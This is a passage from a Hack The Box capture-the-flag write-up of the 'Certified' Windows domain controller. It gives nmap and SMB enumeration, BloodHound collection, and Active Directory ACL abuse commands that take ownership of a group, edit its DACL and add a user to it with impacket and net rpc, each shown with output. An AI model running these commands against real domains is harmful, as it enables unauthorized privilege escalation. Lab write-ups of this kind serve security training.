&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">464/tcp open kpasswd5?
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP &lt;span class="o">(&lt;/span>Domain: certified.htb0., Site: Default-First-Site-Name&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_ssl-date: 2025-02-23T08:23:11+00:00&lt;span class="p">;&lt;/span> +2h49m55s from scanner time.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> ssl-cert: Subject: &lt;span class="nv">commonName&lt;/span>&lt;span class="o">=&lt;/span>DC01.certified.htb
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&amp;lt;unsupported&amp;gt;, DNS:DC01.certified.htb
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Not valid before: 2024-05-13T15:49:36
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_Not valid after: 2025-05-13T15:49:36
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">3268/tcp open ldap Microsoft Windows Active Directory LDAP &lt;span class="o">(&lt;/span>Domain: certified.htb0., Site: Default-First-Site-Name&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> ssl-cert: Subject: &lt;span class="nv">commonName&lt;/span>&lt;span class="o">=&lt;/span>DC01.certified.htb
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&amp;lt;unsupported&amp;gt;, DNS:DC01.certified.htb
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Not valid before: 2024-05-13T15:49:36
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_Not valid after: 2025-05-13T15:49:36
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_ssl-date: 2025-02-23T08:23:13+00:00&lt;span class="p">;&lt;/span> +2h49m55s from scanner time.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP &lt;span class="o">(&lt;/span>Domain: certified.htb0., Site: Default-First-Site-Name&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> ssl-cert: Subject: &lt;span class="nv">commonName&lt;/span>&lt;span class="o">=&lt;/span>DC01.certified.htb
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&amp;lt;unsupported&amp;gt;, DNS:DC01.certified.htb
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Not valid before: 2024-05-13T15:49:36
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_Not valid after: 2025-05-13T15:49:36
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_ssl-date: 2025-02-23T08:23:11+00:00&lt;span class="p">;&lt;/span> +2h49m55s from scanner time.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">5985/tcp open http Microsoft HTTPAPI httpd 2.0 &lt;span class="o">(&lt;/span>SSDP/UPnP&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_http-server-header: Microsoft-HTTPAPI/2.0
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_http-title: Not Found
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">9389/tcp open mc-nmf .NET Message Framing
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">49666/tcp open msrpc Microsoft Windows RPC
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">49670/tcp open msrpc Microsoft Windows RPC
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">49673/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">49674/tcp open msrpc Microsoft Windows RPC
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">49683/tcp open msrpc Microsoft Windows RPC
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">49716/tcp open msrpc Microsoft Windows RPC
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">49740/tcp open msrpc Microsoft Windows RPC
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Warning: OSScan results may be unreliable because we could not find at least &lt;span class="m">1&lt;/span> open and &lt;span class="m">1&lt;/span> closed port
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Device type: general purpose
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Running &lt;span class="o">(&lt;/span>JUST GUESSING&lt;span class="o">)&lt;/span>: Microsoft Windows &lt;span class="m">2019&lt;/span> &lt;span class="o">(&lt;/span>89%&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Aggressive OS guesses: Microsoft Windows Server &lt;span class="m">2019&lt;/span> &lt;span class="o">(&lt;/span>89%&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">No exact OS matches &lt;span class="k">for&lt;/span> host &lt;span class="o">(&lt;/span>&lt;span class="nb">test&lt;/span> conditions non-ideal&lt;span class="o">)&lt;/span>.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Service Info: Host: DC01&lt;span class="p">;&lt;/span> OS: Windows&lt;span class="p">;&lt;/span> CPE: cpe:/o:microsoft:windows
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Host script results:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> smb2-time:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> date: 2025-02-23T08:22:32
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_ start_date: N/A
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_clock-skew: mean: 2h49m54s, deviation: 0s, median: 2h49m54s
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> smb2-security-mode:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> 3:1:1:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_ Message signing enabled and required
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Nmap done at Sun Feb 23 05:33:18 2025 -- 1 IP address (1 host up) scanned in 388.52 seconds&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>As we can see the LDAP and Kerberos indicates that we are dealing with an Active Directory Server (Domain Controller).&lt;/p>
&lt;p>The provided credentials &lt;code>judith.mader:judith09&lt;/code> given in the machine information are valid&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">┌──&lt;span class="o">(&lt;/span>ayoub㉿MyKali&lt;span class="o">)&lt;/span>-&lt;span class="o">[&lt;/span>~/Documents/HTB/Certified&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└─$ sudo crackmapexec smb 10.10.11.41 -u judith.mader -p judith09
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SMB 10.10.11.41 &lt;span class="m">445&lt;/span> DC01 &lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Windows &lt;span class="m">10&lt;/span> / Server &lt;span class="m">2019&lt;/span> Build &lt;span class="m">17763&lt;/span> x64 &lt;span class="o">(&lt;/span>name:DC01&lt;span class="o">)&lt;/span> &lt;span class="o">(&lt;/span>domain:certified.htb&lt;span class="o">)&lt;/span> &lt;span class="o">(&lt;/span>signing:True&lt;span class="o">)&lt;/span> &lt;span class="o">(&lt;/span>SMBv1:False&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SMB 10.10.11.41 &lt;span class="m">445&lt;/span> DC01 &lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> certified.htb&lt;span class="se">\j&lt;/span>udith.mader:judith09
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>The above results also shows us that the Domain name is &lt;code>certified.htb&lt;/code> DC&amp;rsquo;s DNS name is &lt;code>DC01.certified.htb&lt;/code>, which we will use to populate the &lt;code>/etc/hosts&lt;/code> file.&lt;/p>
&lt;p>I used rpcclient to gather a list of users using &lt;code>enumdomusers&lt;/code> command that might be useful in further attacks.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">┌──&lt;span class="o">(&lt;/span>ayoub㉿MyKali&lt;span class="o">)&lt;/span>-&lt;span class="o">[&lt;/span>~/Documents/HTB/Certified&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└─$ rpcclient -U &lt;span class="s2">&amp;#34;judith.mader%judith09&amp;#34;&lt;/span> 10.10.11.41
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">rpcclient $&amp;gt; enumdomusers
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">user:&lt;span class="o">[&lt;/span>Administrator&lt;span class="o">]&lt;/span> rid:&lt;span class="o">[&lt;/span>0x1f4&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">user:&lt;span class="o">[&lt;/span>Guest&lt;span class="o">]&lt;/span> rid:&lt;span class="o">[&lt;/span>0x1f5&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">user:&lt;span class="o">[&lt;/span>krbtgt&lt;span class="o">]&lt;/span> rid:&lt;span class="o">[&lt;/span>0x1f6&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">user:&lt;span class="o">[&lt;/span>judith.mader&lt;span class="o">]&lt;/span> rid:&lt;span class="o">[&lt;/span>0x44f&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">user:&lt;span class="o">[&lt;/span>management_svc&lt;span class="o">]&lt;/span> rid:&lt;span class="o">[&lt;/span>0x451&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">user:&lt;span class="o">[&lt;/span>ca_operator&lt;span class="o">]&lt;/span> rid:&lt;span class="o">[&lt;/span>0x452&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">user:&lt;span class="o">[&lt;/span>alexander.huges&lt;span class="o">]&lt;/span> rid:&lt;span class="o">[&lt;/span>0x641&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">user:&lt;span class="o">[&lt;/span>harry.wilson&lt;span class="o">]&lt;/span> rid:&lt;span class="o">[&lt;/span>0x642&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">user:&lt;span class="o">[&lt;/span>gregory.cameron&lt;span class="o">]&lt;/span> rid:&lt;span class="o">[&lt;/span>0x643&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>I tried to enumerate SMB shares found using CME bellow, but spoiler i couldn&amp;rsquo;t find anything useful in them.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">┌──&lt;span class="o">(&lt;/span>ayoub㉿MyKali&lt;span class="o">)&lt;/span>-&lt;span class="o">[&lt;/span>~&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└─$ sudo crackmapexec smb 10.10.11.41 -d certtified.htb -u judith.mader -p judith09 --shares
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SMB 10.10.11.41 &lt;span class="m">445&lt;/span> DC01 &lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Windows &lt;span class="m">10&lt;/span> / Server &lt;span class="m">2019&lt;/span> Build &lt;span class="m">17763&lt;/span> x64 &lt;span class="o">(&lt;/span>name:DC01&lt;span class="o">)&lt;/span> &lt;span class="o">(&lt;/span>domain:certtified.htb&lt;span class="o">)&lt;/span> &lt;span class="o">(&lt;/span>signing:True&lt;span class="o">)&lt;/span> &lt;span class="o">(&lt;/span>SMBv1:False&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SMB 10.10.11.41 &lt;span class="m">445&lt;/span> DC01 &lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> certtified.htb&lt;span class="se">\j&lt;/span>udith.mader:judith09
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SMB 10.10.11.41 &lt;span class="m">445&lt;/span> DC01 &lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Enumerated shares
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SMB 10.10.11.41 &lt;span class="m">445&lt;/span> DC01 Share Permissions Remark
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SMB 10.10.11.41 &lt;span class="m">445&lt;/span> DC01 ----- ----------- ------
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SMB 10.10.11.41 &lt;span class="m">445&lt;/span> DC01 ADMIN$ Remote Admin
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SMB 10.10.11.41 &lt;span class="m">445&lt;/span> DC01 C$ Default share
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SMB 10.10.11.41 &lt;span class="m">445&lt;/span> DC01 IPC$ READ Remote IPC
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SMB 10.10.11.41 &lt;span class="m">445&lt;/span> DC01 NETLOGON READ Logon server share
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SMB 10.10.11.41 &lt;span class="m">445&lt;/span> DC01 SYSVOL READ Logon server share
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>After a bunch of enumeration attempts, i resorted to &lt;code>Bloodhound&lt;/code> using the provided credentials to try visualize and see if there are some attack paths that we could take advantage of.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">bloodhound-python -d certified.htb -u &lt;span class="s1">&amp;#39;judith.mader&amp;#39;&lt;/span> -p &lt;span class="s1">&amp;#39;judith09&amp;#39;&lt;/span> -dc &lt;span class="s1">&amp;#39;dc01.certified.htb&amp;#39;&lt;/span> -c all -ns 10.10.11.41
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>I searched the user &lt;code>judith.mader&lt;/code> and i used the &lt;code>Transitive Objective Control&lt;/code> build-in query under &lt;code>OUTBOUND OBJECT CONTROL&lt;/code> , which gave me this attack path.&lt;/p>
&lt;p>&lt;img src="https://r4z1o.github.io/p/certified-htb-writeup/Bloodhound1.png"
width="1093"
height="406"
srcset="https://r4z1o.github.io/p/certified-htb-writeup/Bloodhound1_hu_f81f274411bb4e73.png 480w, https://r4z1o.github.io/p/certified-htb-writeup/Bloodhound1_hu_b7dd03a61a49013a.png 1024w"
loading="lazy"
alt="Bloodhound"
class="gallery-image"
data-flex-grow="269"
data-flex-basis="646px"
>&lt;/p>
&lt;p>So we will proceed as follow : &lt;strong>Abuse &lt;code>WriteOwner&lt;/code>ACL to add &lt;code>judith.mader&lt;/code> to the &lt;code>Management&lt;/code> Group &amp;gt; Abuse the &lt;code>GenericWrite&lt;/code> ACL using Shadow Credentials on the &lt;code>management_svc&lt;/code> service account.&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>First, we will make &lt;code>judith.mader&lt;/code> the owner of the &lt;code>Management&lt;/code> Group using &lt;code>impacket-owneredit&lt;/code>&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">┌──&lt;span class="o">(&lt;/span>ayoub㉿MyKali&lt;span class="o">)&lt;/span>-&lt;span class="o">[&lt;/span>~/Documents/HTB/Certified&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└─$ sudo impacket-owneredit -action write -new-owner judith.mader -target MANAGEMENT certified.htb/judith.mader:judith09
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/usr/share/doc/python3-impacket/examples/owneredit.py:87: SyntaxWarning: invalid escape sequence &lt;span class="s1">&amp;#39;\V&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s1">&amp;#39;S-1-5-83-0&amp;#39;&lt;/span>: &lt;span class="s1">&amp;#39;NT VIRTUAL MACHINE\Virtual Machines&amp;#39;&lt;/span>,
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/usr/share/doc/python3-impacket/examples/owneredit.py:96: SyntaxWarning: invalid escape sequence &lt;span class="s1">&amp;#39;\P&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s1">&amp;#39;S-1-5-32-554&amp;#39;&lt;/span>: &lt;span class="s1">&amp;#39;BUILTIN\Pre-Windows 2000 Compatible Access&amp;#39;&lt;/span>,
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&amp;lt;SNIP&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Current owner information below
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> - SID: S-1-5-21-729746778-2675978091-3820388244-1103
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> - sAMAccountName: judith.mader
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> - distinguishedName: &lt;span class="nv">CN&lt;/span>&lt;span class="o">=&lt;/span>Judith Mader,CN&lt;span class="o">=&lt;/span>Users,DC&lt;span class="o">=&lt;/span>certified,DC&lt;span class="o">=&lt;/span>htb
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> OwnerSid modified successfully!
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;ul>
&lt;li>Then i made &lt;code>judith.mader&lt;/code> have write rights on the &lt;code>management&lt;/code> group object using &lt;code>impacket-dacledit&lt;/code>.&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">┌──&lt;span class="o">(&lt;/span>ayoub㉿MyKali&lt;span class="o">)&lt;/span>-&lt;span class="o">[&lt;/span>~/Documents/HTB/Certified&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└─$ sudo impacket-dacledit -action &lt;span class="s1">&amp;#39;write&amp;#39;&lt;/span> -rights &lt;span class="s1">&amp;#39;WriteMembers&amp;#39;&lt;/span> -principal &lt;span class="s1">&amp;#39;judith.mader&amp;#39;&lt;/span> -target-dn &lt;span class="s1">&amp;#39;CN=MANAGEMENT,CN=USERS,DC=CERTIFIED,DC=HTB&amp;#39;&lt;/span> certified.htb/judith.mader:judith09
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/usr/share/doc/python3-impacket/examples/dacledit.py:101: SyntaxWarning: invalid escape sequence &lt;span class="s1">&amp;#39;\V&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s1">&amp;#39;S-1-5-83-0&amp;#39;&lt;/span>: &lt;span class="s1">&amp;#39;NT VIRTUAL MACHINE\Virtual Machines&amp;#39;&lt;/span>,
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/usr/share/doc/python3-impacket/examples/dacledit.py:110: SyntaxWarning: invalid escape sequence &lt;span class="s1">&amp;#39;\P&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s1">&amp;#39;S-1-5-32-554&amp;#39;&lt;/span>: &lt;span class="s1">&amp;#39;BUILTIN\Pre-Windows 2000 Compatible Access&amp;#39;&lt;/span>,
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&amp;lt;SNIP&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/usr/share/doc/python3-impacket/examples/dacledit.py:127: SyntaxWarning: invalid escape sequence &lt;span class="s1">&amp;#39;\R&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s1">&amp;#39;S-1-5-32-580&amp;#39;&lt;/span>: &lt;span class="s1">&amp;#39;BUILTIN\Remote Management Users&amp;#39;&lt;/span>,
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> DACL backed up to dacledit-20250316-063639.bak
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> DACL modified successfully!
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;ul>
&lt;li>Added &lt;code>judith.mader&lt;/code> to the &lt;code>Management&lt;/code> Group using &lt;code>net&lt;/code> to have &lt;code>GenericWrite&lt;/code> on the &lt;code>management_svc&lt;/code> service account.&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">┌──&lt;span class="o">(&lt;/span>ayoub㉿MyKali&lt;span class="o">)&lt;/span>-&lt;span class="o">[&lt;/span>~/Documents/HTB/Certified&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└─$ sudo net rpc group addmem &lt;span class="s2">&amp;#34;management&amp;#34;&lt;/span> &lt;span class="s2">&amp;#34;judith.mader&amp;#34;&lt;/span> -U &lt;span class="s2">&amp;#34;CERTIFIED.HTB&amp;#34;&lt;/span>/&lt;span class="s2">&amp;#34;judith.mader&amp;#34;&lt;/span>%&lt;span class="s2">&amp;#34;judith09&amp;#34;&lt;/span> -S &lt;span class="s2">&amp;#34;certified.htb&amp;#34;&lt;/span>
